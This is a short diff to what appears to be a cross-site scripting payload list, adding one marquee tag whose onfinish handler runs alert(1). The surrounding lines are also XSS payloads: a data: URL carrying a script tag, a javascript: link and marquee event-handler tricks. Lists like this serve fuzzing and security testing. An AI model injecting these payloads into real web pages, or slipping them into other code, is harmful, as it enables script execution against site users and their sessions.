@@ -1165,4 +1165,5 @@ data:text/html,<script>alert(document.domain)</script>
 <base target="<script>alert(1)</script>">
 <a href="javascript:name">CLICK</a>
 </title<marquee/onstart=confirm(1)>xxxx
+<marquee loop=1 width=0 onfinish=alert(1)>
 /* RFI STOP */
